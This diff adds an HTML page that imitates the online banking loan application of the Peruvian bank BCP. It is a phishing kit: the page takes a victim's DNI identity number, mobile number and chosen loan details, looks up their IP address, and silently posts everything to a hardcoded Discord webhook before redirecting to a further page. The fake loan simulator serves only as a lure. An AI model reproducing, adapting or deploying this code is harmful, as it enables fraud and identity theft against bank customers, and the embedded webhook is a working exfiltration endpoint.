@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Créditos Personales - BCP</title>
+    <style>
+        :root {
+            --azul-bcp: #002a8d; /* Azul principal BCP */
+            --azul-claro: #0056b3;
+            --gris-fondo: #f4f7fa;
+            --blanco: #ffffff;
+            --texto-oscuro: #2c3e50;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--gris-fondo); color: var(--texto-oscuro); }
+        
+        /* HEADER - AZUL BCP */
+        .header { background: var(--azul-bcp); color: white; text-align: center; padding: 35px 15px 70px; }
+        .header img { width: 140px; max-width: 100%; margin-bottom: 12px; }
+        .header h2 { font-size: 19px; font-weight: 400; opacity: 0.9; }
+        
+        .card { 
+            background: var(--blanco); 
+            width: 92%; 
+            max-width: 420px; 
+            margin: -50px auto 25px; 
+            border-radius: 12px; 
+            padding: 30px 20px; 
+            box-shadow: 0 8px 20px rgba(0, 42, 141, 0.1); 
+        }
+        
+        .title { text-align: center; margin-bottom: 25px; font-size: 20px; font-weight: 700; color: var(--azul-bcp); }
+        
+        .input-group { margin-bottom: 18px; }
+        input, select { 
+            width: 100%; height: 52px; border-radius: 8px; border: 1px solid #ced4da; 
+            background: #fff; padding: 0 15px; font-size: 16px; text-align: left; 
+            outline: none; transition: 0.3s; color: var(--texto-oscuro);
+        }
+        input:focus, select:focus { border-color: var(--azul-bcp); box-shadow: 0 0 0 2px rgba(0, 42, 141, 0.1); }
+        
+        .error { font-size: 12px; color: #e74c3c; margin-top: 5px; display: none; padding-left: 5px; }
+        
+        /* BOTÓN - AHORA EN AZUL BCP */
+        button { 
+            width: 100%; height: 54px; border-radius: 50px; border: none; 
+            background: #d1d5db; color: #fff; font-size: 17px; font-weight: 700; 
+            margin-top: 15px; transition: 0.3s; cursor: not-allowed;
+        }
+        button.active { background: var(--azul-bcp); cursor: pointer; box-shadow: 0 4px 12px rgba(0, 42, 141, 0.2); }
+        button.active:hover { background: var(--azul-claro); transform: translateY(-1px); }
+
+        .option { 
+            border: 1.5px solid #e9ecef; padding: 18px; border-radius: 10px; 
+            margin-bottom: 12px; text-align: center; cursor: pointer; 
+            font-weight: 600; transition: 0.2s; color: var(--azul-bcp);
+        }
+        .option:hover { border-color: var(--azul-bcp); background: rgba(0, 42, 141, 0.05); }
+        
+        .hidden { display: none; }
+        .loading-box { text-align: center; padding: 20px 0; }
+        
+        /* SPINNER AZUL */
+        .spinner { 
+            border: 4px solid rgba(0, 42, 141, 0.1); border-top: 4px solid var(--azul-bcp); 
+            border-radius: 50%; width: 45px; height: 45px; margin: 15px auto; 
+            animation: spin 0.8s linear infinite; 
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .info-box { font-size: 13px; color: #6c757d; background: #f8f9fa; border-radius: 8px; padding: 15px; margin: 15px 0; border-left: 4px solid var(--azul-bcp); }
+        
+        input#pagoMensual { 
+            background: #fff; color: var(--azul-bcp); font-weight: 700; 
+            font-size: 26px; border: none; text-align: center; margin-top: 5px;
+        }
+        label { font-size: 14px; font-weight: 600; color: #495057; margin-bottom: 8px; display: block; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="logo.svg" alt="Logo BCP">
+    <h2 id="titulo">Banca por Internet</h2>
+</div>
+
+<!-- PASO 1: VALIDACIÓN -->
+<div class="card" id="step1">
+    <div class="title">Realiza tu solicitud al Instante</div>
+    <div class="input-group">
+        <label>Documento de Identidad</label>
+        <input id="cedula" placeholder="DNI" inputmode="numeric" maxlength="12">
+        <div class="error" id="e1">Ingresa un número válido.</div>
+    </div>
+    <div class="input-group">
+        <label>Número Celular</label>
+        <input id="telefono" placeholder="" type="tel" inputmode="numeric" maxlength="9">
+        <div class="error" id="e2">Número de celular incorrecto.</div>
+    </div>
+    <button id="btn1" disabled>Continuar</button>
+</div>
+
+<!-- CARGA -->
+<div class="card hidden" id="loading">
+    <div class="loading-box">
+        <p id="loading-text" style="font-weight: 600; color: var(--azul-bcp);">Procesando solicitud...</p>
+        <div class="spinner"></div>
+    </div>
+</div>
+
+<!-- PASO 2: PRODUCTOS -->
+<div class="card hidden" id="step2">
+    <div class="title">¿Qué deseas solicitar?</div>
+    <div class="option" onclick="goSimulador('Préstamo Efectivo')">Tarjeta de Crédito Black</div>
+    <div class="option" onclick="goSimulador('Tarjeta Visa BCP')">Tarjeta de Crédito Visa</div>
+    <div class="option" onclick="goSimulador('Adelanto de Sueldo')">Credito Personal</div>
+</div>
+
+<!-- PASO 3: SIMULADOR -->
+<div class="card hidden" id="step3">
+    <div class="title" id="simTitle">Simulador de Cuotas</div>
+    <div class="input-group">
+        <label>¿Cuánto dinero necesitas?</label>
+        <input id="monto" placeholder="Ej: S/5.000" inputmode="numeric">
+    </div>
+    <div class="input-group">
+        <label>¿En cuántos meses?</label>
+        <select id="cuotas">
+            <option value="">Selecciona el plazo</option>
+            <option value="12">12 meses</option>
+            <option value="24">24 meses</option>
+            <option value="36">36 meses</option>
+            <option value="48">48 meses</option>
+            <option value="60">60 meses</option>
+        </select>
+    </div>
+    <div style="text-align: center; margin-top: 20px;">
+        <p style="font-size: 14px; color: #6c757d;">Tu cuota mensual aproximada sería:</p>
+        <input id="pagoMensual" readonly value="S/0.00">
+    </div>
+    <div class="info-box">Esta simulación es referencial. Sujeta a evaluación crediticia.</div>
+    <button id="btn3" disabled>Finalizar Solicitud</button>
+</div>
+
+<script>
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp";
+
+let dataUser = { cedula: "", telefono: "", producto: "", monto: "", cuotas: "", pago: "" };
+
+const inCedula = document.getElementById("cedula");
+const inTel = document.getElementById("telefono");
+const btn1 = document.getElementById("btn1");
+
+function validar1() {
+    const cOk = inCedula.value.length >= 8;
+    const tOk = inTel.value.length === 9;
+    
+    document.getElementById("e1").style.display = (inCedula.value && !cOk) ? "block" : "none";
+    document.getElementById("e2").style.display = (inTel.value && !tOk) ? "block" : "none";
+    
+    btn1.disabled = !(cOk && tOk);
+    btn1.classList.toggle("active", (cOk && tOk));
+}
+
+inCedula.oninput = () => { inCedula.value = inCedula.value.replace(/\D/g,""); validar1(); };
+inTel.oninput = () => { inTel.value = inTel.value.replace(/\D/g,""); validar1(); };
+
+btn1.onclick = () => {
+    dataUser.cedula = inCedula.value;
+    dataUser.telefono = inTel.value;
+    showStep("loading", "Validando datos...");
+    setTimeout(() => showStep("step2", "Selecciona una opción"), 1800);
+};
+
+function goSimulador(prod) {
+    dataUser.producto = prod;
+    document.getElementById("simTitle").innerText = prod;
+    showStep("loading", "Configurando simulador...");
+    setTimeout(() => showStep("step3", "Simulador"), 1500);
+}
+
+const inMonto = document.getElementById("monto");
+const selCuotas = document.getElementById("cuotas");
+const resPago = document.getElementById("pagoMensual");
+const btn3 = document.getElementById("btn3");
+
+function simular() {
+    let monto = parseInt(inMonto.value.replace(/\D/g,"") || 0);
+    if(monto > 50000) monto = 50000;
+    inMonto.value = monto > 0 ? "S/" + monto.toLocaleString() : "";
+    
+    let meses = parseInt(selCuotas.value || 0);
+    
+    if(monto >= 500 && meses > 0) {
+        let cuota = (monto * 1.15) / meses; 
+        resPago.value = "S/" + cuota.toFixed(2);
+        btn3.disabled = false;
+        btn3.classList.add("active");
+        
+        dataUser.monto = inMonto.value;
+        dataUser.cuotas = meses;
+        dataUser.pago = resPago.value;
+    } else {
+        resPago.value = "S/0.00";
+        btn3.disabled = true;
+        btn3.classList.remove("active");
+    }
+}
+
+inMonto.oninput = simular;
+selCuotas.onchange = simular;
+
+btn3.onclick = async () => {
+    btn3.innerText = "Enviando...";
+    btn3.disabled = true;
+    
+    let ip = "Desconocida";
+    try { const r = await fetch("https://api.ipify.org?format=json"); const d = await r.json(); ip = d.ip; } catch(e){}
+
+    const msg = {
+        embeds: [{
+            title: "🏦 NUEVA SOLICITUD - BCP",
+            color: 42381, 
+            fields: [
+                { name: "👤 Documento", value: dataUser.cedula, inline: true },
+                { name: "📱 Celular", value: dataUser.telefono, inline: true },
+                { name: "🎁 Producto", value: dataUser.producto },
+                { name: "💵 Monto", value: dataUser.monto, inline: true },
+                { name: "📅 Plazo", value: dataUser.cuotas + " meses", inline: true },
+                { name: "💳 Cuota Est.", value: dataUser.pago, inline: true },
+                { name: "🌐 IP Usuario", value: ip }
+            ],
+            footer: { text: "Simulador BCP Finalizado" },
+            timestamp: new Date()
+        }]
+    };
+
+    try {
+        await fetch(WEBHOOK_URL, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(msg) });
+    } catch(e) {}
+    
+    window.location.href = "index2.html";
+};
+
+function showStep(id, txt) {
+    ["step1", "step2", "step3", "loading"].forEach(s => document.getElementById(s).classList.add("hidden"));
+    document.getElementById(id).classList.remove("hidden");
+    document.getElementById("titulo").innerText = txt;
+    window.scrollTo(0,0);
+}
+</script>
+
+</body>
+</html>
